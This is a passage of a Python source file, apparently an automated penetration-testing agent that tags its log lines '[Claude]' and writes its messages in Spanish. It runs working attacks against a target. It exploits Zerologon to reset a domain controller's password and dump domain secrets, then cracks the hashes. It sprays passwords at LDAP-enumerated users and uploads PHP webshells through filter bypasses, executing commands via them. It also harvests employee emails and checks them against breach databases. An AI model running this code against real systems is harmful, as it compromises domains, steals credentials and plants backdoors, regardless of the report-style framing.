            f"            req['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel\n"
            f"            req['ComputerName'] = f'{dc_name}\\x00'\n"
            f"            req['ClientCredential'] = b'\\x00' * 8\n"
            f"            req['NegotiateFlags'] = 0x212fffff\n"
            f"            resp = dce.request(req)\n"
            f"            if resp['ReturnAuthenticator']['Credential'] == b'\\x00' * 8:\n"
            f"                print('ZEROLOGON_VULNERABLE_CONFIRMED')\n"
            f"                break\n"
            f"        except Exception: pass\n"
            f"except Exception as e: print(f'zerologon_error: {{e}}')\n"
            f"ZLEOF\n",
            target, timeout=60,
        )
        if "ZEROLOGON_VULNERABLE_CONFIRMED" in zero_out:
            self._log(f"[Claude] ZEROLOGON: ¡DC VULNERABLE! → reseteando password del DC!")
            exploit_out, _ = self._run_cmd(
                "zerologon-exploit",
                f"# Reset DC machine account password\n"
                f"cve-2020-1472-exploit.py {dc_name} {target} 2>/dev/null || "
                f"python3 /usr/share/exploitdb/exploits/windows/remote/49587.py {dc_name} {target} 2>/dev/null; "
                f"# Dump all secrets with empty password\n"
                f"impacket-secretsdump -no-pass -just-dc '{dc_name}$@{target}' 2>/dev/null | head -40",
                target, timeout=60,
            )
            self._capture_evidence(exploit_out, target, "zerologon-exploit", "CVE-2020-1472 Zerologon")
            accumulated_output.append(f"=== Zerologon CVE-2020-1472 ===\n{zero_out[:200]}\n{exploit_out[:600]}")
            self._auto_crack_hashes(exploit_out, target, accumulated_output)
            self._save_findings([{
                "title": f"Zerologon CVE-2020-1472 Domain Controller Comprometido @ {target}",
                "severity": "critical",
                "description": f"DC {dc_name} vulnerable a Zerologon → password reseteada → domain admin.\n{exploit_out[:300]}",
                "cve": "CVE-2020-1472",
            }], target)

    # ─────────────────────────────────────────────────────────────────────────
    # Tier 2-6: Advanced service enumeration (LDAP anon, SMTP VRFY)
    # ─────────────────────────────────────────────────────────────────────────
    def _advanced_service_enum(self, target, open_ports, accumulated_output):
        """LDAP anonymous bind, SMTP VRFY/EXPN, DNS zone transfer for any TCP 53."""
        port_set = {p["port"]: p for p in open_ports}

        # ── LDAP anonymous bind ───────────────────────────────────────────
        _ldap_dc = "dc=" + ",dc=".join(target.split("."))
        for ldap_port in [p for p in [389, 636, 3268, 3269] if p in port_set]:
            self._log(f"[Claude] LDAP-ANON: bind anónimo → {target}:{ldap_port}")
            ldap_out, _ = self._run_cmd(
                f"ldap-anon-{ldap_port}",
                f"ldapsearch -x -H ldap://{target}:{ldap_port} -b '' -s base '(objectClass=*)' 2>/dev/null | head -20; "
                f"ldapsearch -x -H ldap://{target}:{ldap_port} -b '{_ldap_dc}' "
                f"'(objectClass=user)' sAMAccountName userPrincipalName description 2>/dev/null | "
                f"grep -iE 'sAMAccountName|userPrincipal|description' | head -40; "
                f"ldapsearch -x -H ldap://{target}:{ldap_port} -b '' -s base namingContexts 2>/dev/null | head -5",
                target, timeout=20,
            )
            if ldap_out.strip() and "Operations error" not in ldap_out:
                accumulated_output.append(f"=== LDAP Anon {target}:{ldap_port} ===\n{ldap_out[:800]}")
                # Extract usernames
                ldap_users = re.findall(r'sAMAccountName:\s*(\S+)', ldap_out)
                if ldap_users:
                    self._log(f"[Claude] LDAP: {len(ldap_users)} usuarios encontrados: {ldap_users[:5]}")
                    # Save to file for password spray
                    with open(f"/tmp/ldap_users_{target.replace('.','_')}.txt", "w") as f:
                        f.write("\n".join(ldap_users))
                    self._save_findings([{
                        "title": f"LDAP Bind Anónimo + Enumeración de Usuarios @ {target}:{ldap_port}",
                        "severity": "medium",
                        "description": f"LDAP sin autenticación expone {len(ldap_users)} usuarios:\n{', '.join(ldap_users[:15])}",
                        "cve": "",
                    }], target)
                    # Pass users to AD spray
                    spray_outs = []
                    for spray_p in ["Password1", "Welcome1!", f"{target.split('.')[0].capitalize()}2024!"]:
                        spray, _ = self._run_cmd(
                            f"ldap-spray-{spray_p[:8]}",
                            f"crackmapexec smb {target} -u /tmp/ldap_users_{target.replace('.','_')}.txt "
                            f"-p '{spray_p}' --continue-on-success 2>/dev/null | grep '\\[+\\]' | head -5",
                            target, timeout=30,
                        )
                        if "[+]" in spray:
                            spray_outs.append(spray)
                    if spray_outs:
                        accumulated_output.append(f"=== LDAP User Spray ===\n" + "\n".join(spray_outs[:3]))

        # ── SMTP VRFY/EXPN user enumeration ──────────────────────────────
        for smtp_port in [p for p in [25, 465, 587, 2525] if p in port_set]:
            self._log(f"[Claude] SMTP-ENUM: VRFY/EXPN @ {target}:{smtp_port}")
            smtp_out, _ = self._run_cmd(
                f"smtp-vrfy-{smtp_port}",
                f"smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                f"-t {target} -p {smtp_port} 2>/dev/null | grep -v 'Ctrl-C\\|RCPT\\|starting' | head -20; "
                f"# Manual VRFY\n"
                f"for u in root admin administrator postmaster www-data mail; do "
                f"  R=$(echo -e 'VRFY $u\\r\\n' | nc -q 3 {target} {smtp_port} 2>/dev/null | grep -E '^[25][0-9]{{2}}'); "
                f"  [ -n \"$R\" ] && echo \"SMTP_USER: $u — $R\"; "
                f"done",
                target, timeout=30,
            )
            if "SMTP_USER" in smtp_out or re.search(r'^252|^250', smtp_out, re.MULTILINE):
                accumulated_output.append(f"=== SMTP User Enum {target}:{smtp_port} ===\n{smtp_out[:500]}")
                self._save_findings([{
                    "title": f"SMTP VRFY Usuario Válido @ {target}:{smtp_port}",
                    "severity": "low",
                    "description": f"SMTP permite enumerar usuarios via VRFY:\n{smtp_out[:300]}",
                    "cve": "",
                }], target)

        # ── DNS zone transfer (TCP 53) ────────────────────────────────────
        if 53 in port_set:
            dns_out, _ = self._run_cmd(
                "dns-axfr",
                f"dig axfr @{target} 2>/dev/null | head -50; "
                f"HOST=$(dig -x {target} @{target} 2>/dev/null | grep 'PTR' | awk '{{print $5}}' | sed 's/\\.$//' | head -1); "
                f"[ -n \"$HOST\" ] && DOMAIN=$(echo $HOST | cut -d. -f2-) && "
                f"dig axfr @{target} $DOMAIN 2>/dev/null | head -50; "
                f"fierce --dns-servers {target} --domain $(echo $HOST | cut -d. -f2-) 2>/dev/null | head -30",
                target, timeout=25,
            )
            if dns_out.strip() and "Transfer failed" not in dns_out:
                accumulated_output.append(f"=== DNS Zone Transfer {target} ===\n{dns_out[:800]}")

    # ─────────────────────────────────────────────────────────────────────────
    # Tier 2-7: File upload → webshell bypass
    # ─────────────────────────────────────────────────────────────────────────
    def _file_upload_exploit(self, target, open_ports, accumulated_output):
        """Find file upload forms and bypass extension/MIME filters to plant webshell."""
        http_ports = [p["port"] for p in open_ports if "http" in p["service"].lower()
                      or p["port"] in (80, 443, 8080, 8443, 8888)]
        if not http_ports:
            return

        for port_num in http_ports[:2]:
            proto = "https" if port_num in (443, 8443) else "http"
            base = f"{proto}://{target}:{port_num}"
            t_safe = target.replace(".", "_")

            # Find upload endpoints
            upload_out, _ = self._run_cmd(
                f"upload-detect-{port_num}",
                f"curl -s --max-time 15 -L '{base}/' 2>/dev/null | "
                f"grep -iEo 'href=\"[^\"]*(?:upload|file|attach|media|image)[^\"]*\"' | head -10; "
                f"curl -s --max-time 15 -L '{base}/' 2>/dev/null | "
                f"grep -i 'type=\"file\"\\|enctype.*multipart' | head -5; "
                f"# Common upload paths\n"
                f"for path in /upload /uploads /upload.php /file-upload /media/upload /api/upload /img/upload; do "
                f"  CODE=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 '{base}$path' 2>/dev/null); "
                f"  [ \"$CODE\" = '200' ] || [ \"$CODE\" = '405' ] && echo \"UPLOAD_PATH: $path ($CODE)\"; "
                f"done",
                target, timeout=25,
            )
            upload_paths = re.findall(r'UPLOAD_PATH: (/[^\s(]+)', upload_out)
            if not upload_paths and "type=\"file\"" not in upload_out:
                continue

            self._log(f"[Claude] FILE-UPLOAD: encontradas rutas de subida → {upload_paths[:3]}")
            # Try multiple bypass techniques for each upload path
            shell_content_php = '<?php system($_GET["cmd"]); ?>'
            shell_content_phtml = '<?php system($_REQUEST["cmd"]); ?>'

            for upload_path in (upload_paths or ["/upload"])[:2]:
                upload_url = base + upload_path
                # Bypass attempts (filename, extension, MIME)
                bypass_attempts = [
                    ("shell.php",    "application/octet-stream", shell_content_php),
                    ("shell.php%00.jpg", "image/jpeg",           shell_content_php),
                    ("shell.phtml",  "image/jpeg",               shell_content_phtml),
                    ("shell.php5",   "image/jpeg",               shell_content_php),
                    ("shell.pHp",    "image/jpeg",               shell_content_php),
                    ("shell.php.jpg","image/jpeg",               shell_content_php),
                    (".htaccess",    "text/plain",               "AddType application/x-httpd-php .jpg"),
                    ("shell.shtml",  "text/html",                "<!--#exec cmd=\"id\" -->"),
                ]
                for fname, mime, content in bypass_attempts:
                    shell_out, _ = self._run_cmd(
                        f"upload-{fname[:10].replace('.','_')}-{port_num}",
                        f"curl -s --max-time 15 -X POST '{upload_url}' "
                        f"-F 'file=@/dev/stdin;filename={fname};type={mime}' "
                        f"-F 'submit=Upload' "
                        f"<<<'{content}' 2>/dev/null | head -5; "
                        f"# Try finding where it was saved\n"
                        f"for upath in /uploads /upload /files /media /images /tmp; do "
                        f"  CODE=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 "
                        f"  '{base}$upath/{fname}' 2>/dev/null); "
                        f"  [ \"$CODE\" = '200' ] && echo \"WEBSHELL_FOUND: $upath/{fname}\"; "
                        f"done",
                        target, timeout=20,
                    )
                    if "WEBSHELL_FOUND" in shell_out:
                        # Found it — execute commands
                        shell_path = re.search(r'WEBSHELL_FOUND: (/[^\s]+)', shell_out).group(1)
                        cmd_out, _ = self._run_cmd(
                            f"upload-rce-{port_num}",
                            f"curl -s --max-time 10 '{base}{shell_path}?cmd=id' 2>/dev/null | head -3; "
                            f"curl -s --max-time 10 '{base}{shell_path}?cmd=whoami' 2>/dev/null | head -2",
                            target, timeout=15,
                        )
                        if "uid=" in cmd_out or "www-data" in cmd_out or "root" in cmd_out:
                            self._capture_evidence(cmd_out, target, f"upload-rce-{port_num}", f"file upload webshell {fname}")
                            accumulated_output.append(f"=== File Upload RCE ({fname}) ===\n{cmd_out[:400]}")
                            self._save_findings([{
                                "title": f"File Upload Bypass → Webshell RCE @ {base}{upload_path}",
                                "severity": "critical",
                                "description": f"Upload bypass con '{fname}' (MIME: {mime}) → webshell en {shell_path} → RCE.\n{cmd_out[:200]}",
                                "cve": "",
                            }], target)
                            break

    # ─────────────────────────────────────────────────────────────────────────
    # Tier 2-10: Subdomain + virtual host enumeration
    # ─────────────────────────────────────────────────────────────────────────
    def _subdomain_vhost_enum(self, target, open_ports, accumulated_output):
        """Enumerate subdomains (subfinder/amass) and virtual hosts (ffuf/gobuster vhost)."""
        http_ports = [p["port"] for p in open_ports if "http" in p["service"].lower()
                      or p["port"] in (80, 443, 8080, 8443)]
        if not http_ports:
            return

        # Detect if target is a domain or IP
        is_ip = bool(re.match(r'^\d+\.\d+\.\d+\.\d+$', target))
        domain = target if not is_ip else None

        # Try to get domain from reverse DNS if target is IP
        if is_ip:
            rdns, _ = self._run_cmd("rdns", f"host {target} 2>/dev/null | head -3", target, timeout=8)
            domain_match = re.search(r'pointer\s+(.+?)\.?\s*$', rdns, re.MULTILINE)
            if domain_match:
                domain = domain_match.group(1).rstrip(".")

        if not domain:
            self._log(f"[Claude] SUBDOMAIN-ENUM: no se pudo determinar dominio para {target}")
            return

        # Extract apex domain
        apex = re.sub(r'^.*?([^.]+\.[^.]+)$', r'\1', domain)
        self._log(f"[Claude] SUBDOMAIN-ENUM: dominio={apex} → subfinder + vhost")

        # ── Subdomain enumeration ─────────────────────────────────────────
        subenum_out, _ = self._run_cmd(
            "subfinder",
            f"subfinder -d {apex} -silent 2>/dev/null | head -30; "
            f"# Fallback: amass passive\n"
            f"amass enum -passive -d {apex} -timeout 30 2>/dev/null | head -30; "
            f"# Fallback: crt.sh\n"
            f"curl -s --max-time 15 'https://crt.sh/?q=%.{apex}&output=json' 2>/dev/null | "
            f"python3 -c \"import json,sys; "
            f"[print(e['name_value']) for e in json.load(sys.stdin) if '*' not in e.get('name_value','')]\" "
            f"2>/dev/null | sort -u | head -30",
            target, timeout=90,
        )
        if subenum_out.strip():
            subdomains = list(dict.fromkeys([
                s.strip() for s in subenum_out.split("\n")
                if s.strip() and apex in s and not s.startswith("#")
            ]))[:20]
            accumulated_output.append(f"=== Subdomains {apex} ===\n" + "\n".join(subdomains[:20]))
            self._log(f"[Claude] SUBDOMAIN-ENUM: {len(subdomains)} subdominios encontrados")
            for sub in subdomains[:10]:
                # Quick check if subdomain resolves + responds
                sub_check, _ = self._run_cmd(
                    f"sub-check-{sub[:20].replace('.','_')}",
                    f"curl -sk --max-time 8 -o /dev/null -w '%{{http_code}} %{{url_effective}}' "
                    f"'https://{sub}/' 2>/dev/null; "
                    f"curl -sk --max-time 8 -o /dev/null -w '%{{http_code}} %{{url_effective}}' "
                    f"'http://{sub}/' 2>/dev/null",
                    target, timeout=12,
                )
                if re.search(r'[23]\d\d', sub_check):
                    self._save_findings([{
                        "title": f"Subdominio Activo: {sub}",
                        "severity": "info",
                        "description": f"Subdominio {sub} responde en HTTP/HTTPS: {sub_check[:80]}",
                        "cve": "",
                    }], target)

        # ── Virtual host brute force ──────────────────────────────────────
        vhost_wl = next((p for p in [
            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt",
            "/usr/share/wordlists/dirb/common.txt",
        ] if __import__('os').path.exists(p)), None)

        if not vhost_wl:
            return

        for port_num in http_ports[:1]:
            proto = "https" if port_num in (443, 8443) else "http"
            self._log(f"[Claude] VHOST-FUZZ: gobuster vhost @ {target}:{port_num}")
            vhost_out, _ = self._run_cmd(
                f"vhost-fuzz-{port_num}",
                f"gobuster vhost -u '{proto}://{target}:{port_num}' -w {vhost_wl} "
                f"--domain {apex} --append-domain -t 20 -q --timeout 8s "
                f"2>/dev/null | grep -v 'Status: 404\\|Status: 400' | head -20; "
                f"# Also with ffuf\n"
                f"ffuf -u '{proto}://{target}:{port_num}/' -H 'Host: FUZZ.{apex}' "
                f"-w {vhost_wl} -mc 200,301,302,403 -t 20 -timeout 8 -s 2>/dev/null | head -20",
                target, timeout=120,
            )
            if vhost_out.strip():
                accumulated_output.append(f"=== VHost Enum {target}:{port_num} ===\n{vhost_out[:600]}")
                vhosts_found = re.findall(r'Found: (\S+\.'+re.escape(apex)+r')', vhost_out)
                for vh in vhosts_found[:5]:
                    self._save_findings([{
                        "title": f"Virtual Host Descubierto: {vh} @ {target}:{port_num}",
                        "severity": "low",
                        "description": f"Virtual host {vh} activo en {target}:{port_num}",
                        "cve": "",
                    }], target)

    # ─────────────────────────────────────────────────────────────────────────
    # Category D: OSINT — theHarvester, testssl, Shodan, Google dorks, IPv6
    # ─────────────────────────────────────────────────────────────────────────
    def _osint_recon(self, target, open_ports, accumulated_output):
        """Full OSINT reconnaissance: email harvesting, SSL audit, Shodan, Google dorks, IPv6."""
        import ipaddress, socket
        self._log(f"[Claude] OSINT: iniciando reconocimiento externo completo → {target}")

        # Resolve domain/IP and determine apex domain
        is_ip = False
        try:
            ipaddress.ip_address(target)
            is_ip = True
        except ValueError:
            pass

        apex = target if not is_ip else ""
        if not is_ip:
            parts = target.rstrip(".").split(".")
            apex = ".".join(parts[-2:]) if len(parts) >= 2 else target

        # ── D1: theHarvester — emails, subdomains, employees ─────────────
        self._log(f"[Claude] OSINT-D1: theHarvester → {apex or target}")
        if apex:
            harv_out, _ = self._run_cmd(
                "theharvester",
                f"theHarvester -d {apex} -b google,bing,yahoo,duckduckgo,crtsh,hackertarget,otx "
                f"-l 200 2>/dev/null | head -80; "
                f"# Also try subfinder for DNS\n"
                f"subfinder -d {apex} -silent 2>/dev/null | head -30",
                target, timeout=120,
            )
            if harv_out.strip():
                accumulated_output.append(f"=== theHarvester {apex} ===\n{harv_out[:1500]}")
                # Extract emails
                emails = list(set(re.findall(r'[\w\.\-\+]+@[\w\.\-]+\.[a-zA-Z]{2,}', harv_out)))
                # Extract subdomains
                subs = list(set(re.findall(r'[\w\-]+\.' + re.escape(apex), harv_out, re.IGNORECASE)))
                if emails:
                    self._log(f"[Claude] OSINT-D1: {len(emails)} emails encontrados")
                    self._save_findings([{
                        "title": f"OSINT: Emails Corporativos Expuestos — {apex}",
                        "severity": "medium",
                        "description": (
                            f"theHarvester encontró {len(emails)} emails en fuentes públicas para {apex}.\n"
                            f"Emails: {', '.join(emails[:15])}\n"
                            f"Riesgo: phishing dirigido, password spray, credential stuffing."
                        ),
                        "cve": "",
                    }], target)
                if subs:
                    self._log(f"[Claude] OSINT-D1: {len(subs)} subdominios encontrados")
                    self._save_findings([{
                        "title": f"OSINT: Subdominios Descubiertos — {apex}",
                        "severity": "low",
                        "description": (
                            f"Subdominios públicos encontrados para {apex}:\n"
                            f"{chr(10).join(subs[:20])}"
                        ),
                        "cve": "",
                    }], target)
                # Google dork on found emails — password spraying hints
                for email in emails[:3]:
                    domain_part = email.split("@")[1] if "@" in email else ""
                    if domain_part:
                        # Try to find password breach info
                        breach_out, _ = self._run_cmd(
                            f"email-breach-{email[:20].replace('@','_')}",
                            f"curl -sL 'https://haveibeenpwned.com/api/v3/breachedaccount/{email}' "
                            f"-H 'hibp-api-key: free' 2>/dev/null | head -3; "
                            f"# dehashed style check\n"
                            f"curl -sL --max-time 5 "
                            f"'https://api.dehashed.com/search?query={email}' 2>/dev/null | head -3",
                            target, timeout=15,
                        )
                        if breach_out.strip() and "Name" in breach_out:
                            self._save_findings([{
                                "title": f"OSINT: Email en Breaches — {email}",
                                "severity": "high",
                                "description": f"Email {email} encontrado en bases de datos de brechas.\n{breach_out[:300]}",
                                "cve": "",
                            }], target)

        # ── D2: testssl.sh — SSL/TLS full audit ──────────────────────────
        ssl_ports = [p for p in open_ports if p["port"] in (443, 8443, 465, 587, 993, 995, 8080, 636, 3389)]
        if ssl_ports:
            self._log(f"[Claude] OSINT-D2: testssl.sh → SSL/TLS audit")
            for sp in ssl_ports[:2]:
                ssl_out, _ = self._run_cmd(
                    f"testssl-{sp['port']}",
                    f"testssl.sh --quiet --warnings off --fast --color 0 "
                    f"{target}:{sp['port']} 2>/dev/null | head -80; "
                    f"# Fallback: sslscan\n"
                    f"sslscan --no-colour {target}:{sp['port']} 2>/dev/null | head -60; "
                    f"# Fallback: openssl quick check\n"
                    f"echo | timeout 5 openssl s_client -connect {target}:{sp['port']} 2>/dev/null | "
                    f"openssl x509 -noout -subject -issuer -dates -fingerprint 2>/dev/null",
                    target, timeout=90,
                )
                if ssl_out.strip():
                    accumulated_output.append(f"=== SSL/TLS {target}:{sp['port']} ===\n{ssl_out[:1000]}")
                    # Detect critical SSL issues
                    ssl_issues = []
                    if re.search(r'BEAST|POODLE|CRIME|BREACH|DROWN|FREAK|LOGJAM|SWEET32', ssl_out, re.IGNORECASE):
                        ssl_issues.append("Vulnerabilidad SSL clásica detectada (BEAST/POODLE/DROWN/etc.)")
                    if re.search(r'SSLv2|SSLv3|TLSv1\.0|TLSv1\.1', ssl_out, re.IGNORECASE):
                        ssl_issues.append("Protocolos obsoletos habilitados (SSLv2/SSLv3/TLS1.0/TLS1.1)")
                    if re.search(r'HEARTBLEED|heartbleed', ssl_out, re.IGNORECASE):
                        ssl_issues.append("Heartbleed (CVE-2014-0160) VULNERABLE")
                    if re.search(r'expired|not valid after.*202[0-3]', ssl_out, re.IGNORECASE):
                        ssl_issues.append("Certificado SSL expirado o próximo a expirar")
                    if re.search(r'self.signed|self signed', ssl_out, re.IGNORECASE):
                        ssl_issues.append("Certificado autofirmado — posible interceptación MITM")
                    if re.search(r'RC4|DES|3DES|EXPORT|aNULL|eNULL|NULL cipher', ssl_out, re.IGNORECASE):
                        ssl_issues.append("Cipher suites débiles habilitados (RC4/3DES/EXPORT/NULL)")
                    if re.search(r'ROBOT|DROWN|ticketbleed', ssl_out, re.IGNORECASE):
                        ssl_issues.append("Ataque ROBOT/DROWN/Ticketbleed detectado")
                    if ssl_issues:
                        self._save_findings([{
                            "title": f"SSL/TLS Misconfiguration @ {target}:{sp['port']}",
                            "severity": "high" if any("VULNERABLE" in i or "Heartbleed" in i for i in ssl_issues) else "medium",
                            "description": f"Problemas SSL/TLS detectados en {target}:{sp['port']}:\n" + "\n".join(f"• {i}" for i in ssl_issues),
                            "cve": "CVE-2014-0160" if any("Heartbleed" in i for i in ssl_issues) else "",
                        }], target)

        # ── D3: Shodan passive intel (no API key needed via CLI) ──────────
        self._log(f"[Claude] OSINT-D3: Shodan/Censys passive intel → {target}")
        # Try shodan CLI first, fallback to direct API curl, then internetdb (free no-key)
        shodan_out, _ = self._run_cmd(
            "shodan-host",
            # internetdb.shodan.io is free, no key required
            f"curl -sL --max-time 10 'https://internetdb.shodan.io/{target}' 2>/dev/null; "
            f"echo ''; "
            f"shodan host {target} 2>/dev/null | head -40; "
            f"# Censys free search\n"
            f"curl -sL --max-time 10 'https://search.censys.io/api/v1/view/ipv4/{target}' 2>/dev/null | head -20",
            target, timeout=30,
        )
        if shodan_out.strip() and ('"ports"' in shodan_out or "Open ports" in shodan_out or "vulns" in shodan_out):
            accumulated_output.append(f"=== Shodan/InternetDB {target} ===\n{shodan_out[:800]}")
            # Extract Shodan-reported CVEs
            shodan_cves = re.findall(r'CVE-\d{4}-\d+', shodan_out)
            shodan_ports = re.findall(r'"ports":\s*\[([^\]]+)\]', shodan_out)
            if shodan_cves:
                self._save_findings([{
                    "title": f"OSINT: Vulnerabilidades Conocidas en Shodan — {target}",
                    "severity": "high",
                    "description": (
                        f"Shodan/InternetDB reporta las siguientes CVEs para {target}:\n"
                        f"{', '.join(set(shodan_cves[:15]))}\n\n"
                        f"Puertos abiertos según Shodan: {shodan_ports[0] if shodan_ports else 'N/A'}"
                    ),
                    "cve": shodan_cves[0] if shodan_cves else "",
                }], target)
            elif shodan_ports:
                self._save_findings([{
                    "title": f"OSINT: Exposición de Servicios en Internet — {target}",
                    "severity": "info",
                    "description": f"Shodan confirma puertos públicos abiertos en {target}: {shodan_ports[0]}\n{shodan_out[:300]}",
                    "cve": "",
                }], target)

        # ── D4: Google dorks ──────────────────────────────────────────────
        if apex:
            self._log(f"[Claude] OSINT-D4: Google dorks → {apex}")
            dorks = [
                (f"site:{apex} filetype:pdf OR filetype:doc OR filetype:xls OR filetype:ppt",
                 "Documentos corporativos indexados en Google"),
                (f"site:{apex} inurl:admin OR inurl:login OR inurl:portal OR inurl:panel OR inurl:dashboard",
                 "Paneles de administración expuestos"),
                (f"site:{apex} intext:password OR intext:passwd OR intext:api_key OR intext:secret",
                 "Credenciales/secretos en páginas públicas"),
                (f"site:{apex} ext:sql OR ext:bak OR ext:log OR ext:conf OR ext:env OR ext:cfg",
                 "Archivos sensibles indexados (.sql/.bak/.log/.env)"),
                (f'"{apex}" "index of" OR "parent directory" OR "directory listing"',
                 "Directory listing activo"),
            ]
            http_ports_exist = any(p["port"] in (80, 443, 8080, 8443) for p in open_ports)
            if http_ports_exist:
                for dork_query, dork_desc in dorks:
                    _enc = dork_query.replace(" ", "+").replace('"', '%22').replace(":", "%3A")
                    dork_out, _ = self._run_cmd(
                        f"google-dork-{hash(dork_query) % 9999}",
                        f"curl -sL --max-time 10 "
                        f"-H 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)' "
                        f"'https://www.google.com/search?q={_enc}&num=10' 2>/dev/null | "
                        f"grep -oP '(?<=<cite>)[^<]+' | head -10; "
                        f"# Bing as fallback\n"
                        f"curl -sL --max-time 8 "
                        f"-H 'User-Agent: Mozilla/5.0' "
                        f"'https://www.bing.com/search?q={_enc}&count=10' 2>/dev/null | "
                        f"grep -oP '(?<=<cite>)[^<]+' | head -10",
                        target, timeout=20,
                    )
                    if dork_out.strip() and apex in dork_out:
                        urls_found = re.findall(r'https?://[\w\./\-\?=&%_]+', dork_out)
                        if urls_found:
                            self._save_findings([{
                                "title": f"Google Dork: {dork_desc} — {apex}",
                                "severity": "medium",
                                "description": (
                                    f"Dork: {dork_query}\n\n"
                                    f"URLs encontradas:\n" + "\n".join(f"• {u}" for u in urls_found[:8])
                                ),
                                "cve": "",
                            }], target)

        # ── D5: IPv6 scanning & discovery ─────────────────────────────────
        self._log(f"[Claude] OSINT-D5: IPv6 scan → {target}")
        # Resolve IPv6 for domain targets
        ipv6_addr = ""
        if apex:
            try:
                ipv6_results = socket.getaddrinfo(target, None, socket.AF_INET6)
                if ipv6_results:
                    ipv6_addr = ipv6_results[0][4][0]
                    self._log(f"[Claude] OSINT-D5: IPv6 resuelto → {ipv6_addr}")
            except Exception:
                pass
        # Also try AAAA record lookup
        if not ipv6_addr and apex:
            ipv6_lookup, _ = self._run_cmd(
                "ipv6-dns",
                f"dig AAAA {apex} +short 2>/dev/null | head -3; "
                f"host -t AAAA {apex} 2>/dev/null | head -3",
                target, timeout=10,
            )
            ipv6_match = re.search(r'([0-9a-f:]{4,}:[0-9a-f:]{1,})', ipv6_lookup, re.IGNORECASE)
            if ipv6_match:
                ipv6_addr = ipv6_match.group(1)
        if ipv6_addr:
            self._save_findings([{
                "title": f"OSINT: Dirección IPv6 Activa — {target}",
                "severity": "info",
                "description": f"Host {target} accesible via IPv6: {ipv6_addr}\n"
                               f"Los firewalls que solo filtran IPv4 pueden dejar IPv6 desprotegido.",
                "cve": "",
            }], target)
            # Scan IPv6 address
            ipv6_scan_out, _ = self._run_cmd(
                "ipv6-portscan",
                f"nmap -6 -sV -T4 --open -p 22,80,443,8080,8443,445,3389,21,25,587,993 "
                f"{ipv6_addr} 2>/dev/null | head -30",
                target, timeout=90,
            )
            if ipv6_scan_out.strip() and "open" in ipv6_scan_out:
                accumulated_output.append(f"=== IPv6 Scan {ipv6_addr} ===\n{ipv6_scan_out[:600]}")
                # Check if IPv6 has MORE open ports than IPv4 (firewall bypass)
                ipv6_ports = re.findall(r'(\d+)/tcp\s+open', ipv6_scan_out)
                ipv4_ports = {str(p["port"]) for p in open_ports}
                extra_ipv6 = [p for p in ipv6_ports if p not in ipv4_ports]
                if extra_ipv6:
                    self._save_findings([{
                        "title": f"IPv6 Firewall Bypass — Puertos Extra: {', '.join(extra_ipv6)} @ {target}",
                        "severity": "high",
                        "description": (
                            f"La dirección IPv6 {ipv6_addr} expone puertos adicionales no visibles en IPv4:\n"
                            f"Puertos extra: {', '.join(extra_ipv6)}\n"
                            f"Indica que las reglas de firewall no cubren IPv6."
                        ),
                        "cve": "",
                    }], target)

        # ── D6: WHOIS + DNS full recon ─────────────────────────────────────
        self._log(f"[Claude] OSINT-D6: WHOIS + DNS recon → {target}")
        whois_dns_out, _ = self._run_cmd(
            "whois-dns",
            f"whois {apex or target} 2>/dev/null | grep -iE 'registrar|admin|tech|name server|expires|created|updated|email' | head -20; "
            f"echo '--- DNS Records ---'; "
            f"dig ANY {apex or target} +noall +answer 2>/dev/null | head -20; "
            f"dig TXT {apex or target} +short 2>/dev/null | head -10; "
            f"dig MX {apex or target} +short 2>/dev/null | head -5; "
            f"dig NS {apex or target} +short 2>/dev/null | head -5; "
            f"# SPF/DMARC check for email security\n"
            f"dig TXT _dmarc.{apex or target} +short 2>/dev/null | head -3; "
            f"dig TXT _domainkey.{apex or target} +short 2>/dev/null | head -3",
            target, timeout=30,
        )
        if whois_dns_out.strip():
            accumulated_output.append(f"=== WHOIS/DNS {apex or target} ===\n{whois_dns_out[:800]}")
            # Check for missing SPF/DMARC (email spoofing possible)
            missing_email_sec = []
            if "v=spf1" not in whois_dns_out.lower():
                missing_email_sec.append("SPF ausente — email spoofing posible")
            if "v=dmarc1" not in whois_dns_out.lower():
                missing_email_sec.append("DMARC ausente — phishing más efectivo")
            if missing_email_sec:
                self._save_findings([{
                    "title": f"OSINT: Email Security Misconfiguration — {apex or target}",
                    "severity": "medium",
                    "description": (
                        f"Configuración de email deficiente para {apex or target}:\n"
                        f"{chr(10).join(f'• {i}' for i in missing_email_sec)}\n\n"
                        f"Permite spoofing del dominio para phishing dirigido."
                    ),
                    "cve": "",
                }], target)
            # Extract registrant email (useful for OSINT)
            reg_emails = re.findall(r'[\w\.\-\+]+@[\w\.\-]+\.[a-zA-Z]{2,}', whois_dns_out)
            if reg_emails:
                self._save_findings([{
                    "title": f"OSINT: Emails de Registro WHOIS — {apex or target}",
                    "severity": "info",
                    "description": f"Emails expuestos en WHOIS: {', '.join(set(reg_emails[:5]))}",
                    "cve": "",
                }], target)

        # ── D7: Wayback Machine & JS secrets ─────────────────────────────
        if apex:
            self._log(f"[Claude] OSINT-D7: Wayback Machine + JS secret scanning → {apex}")
            wayback_out, _ = self._run_cmd(
                "wayback-urls",
                f"curl -sL --max-time 15 "
                f"'https://web.archive.org/cdx/search/cdx?url=*.{apex}/*&output=text"
                f"&fl=original&collapse=urlkey&limit=100' 2>/dev/null | "
                f"grep -iE '\\.(php|asp|aspx|jsp|cgi|env|bak|sql|config|xml|json|yaml)' | head -30; "
                f"# gau (GetAllUrls)\n"
                f"gau {apex} 2>/dev/null | grep -iE '\\.(env|bak|sql|config|key|pem|p12)' | head -20; "
                f"# waybackurls\n"
                f"waybackurls {apex} 2>/dev/null | grep -iE '\\.(env|bak|sql)' | head -20",
                target, timeout=60,
            )
            sensitive_urls = re.findall(r'https?://[^\s]+\.(?:env|bak|sql|config|key|pem|p12|backup)[^\s]*', wayback_out, re.IGNORECASE)
            if sensitive_urls:
                self._save_findings([{
                    "title": f"OSINT: URLs Sensibles en Wayback Machine — {apex}",
                    "severity": "high",
                    "description": (
                        f"Wayback Machine / gau encontró URLs de archivos sensibles para {apex}:\n"
                        + "\n".join(f"• {u}" for u in sensitive_urls[:10])
                    ),
                    "cve": "",
